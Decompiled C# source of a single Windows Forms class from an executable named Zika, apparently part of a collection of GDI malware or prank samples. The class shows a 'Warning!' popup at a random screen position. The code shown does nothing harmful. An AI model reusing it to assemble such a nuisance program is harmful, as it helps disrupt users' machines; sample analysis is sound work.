// Decompiled with JetBrains decompiler
// Type: Zika.Form9
// Assembly: Zika, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C7CE6D81-E560-4B98-8463-4AED586D3B4E
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\GDI\Zika\Zika.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

#nullable disable
namespace Zika;

public class Form9 : Form
{
  private IContainer components;
  private Button button1;

  public Form9() => this.InitializeComponent();

  private void button1_Click(object sender, EventArgs e) => this.Close();

  private void Form9_Load(object sender, EventArgs e)
  {
    int width = Screen.PrimaryScreen.Bounds.Width;
    int height = Screen.PrimaryScreen.Bounds.Height;
    Random random = new Random();
    this.Top = random.Next(0, width - this.Width);
    this.Left = random.Next(0, height - this.Height);
  }

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    this.button1 = new Button();
    this.SuspendLayout();
    this.button1.Location = new Point(56, 42);
    this.button1.Name = "button1";
    this.button1.Size = new Size(75, 23);
    this.button1.TabIndex = 0;
    this.button1.Text = "OK";
    this.button1.UseVisualStyleBackColor = true;
    this.button1.Click += new EventHandler(this.button1_Click);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(189, 112 /*0x70*/);
    this.Controls.Add((Control) this.button1);
    this.FormBorderStyle = FormBorderStyle.FixedSingle;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (Form9);
    this.ShowIcon = false;
    this.Text = "Warning!";
    this.Load += new EventHandler(this.Form9_Load);
    this.ResumeLayout(false);
  }
}
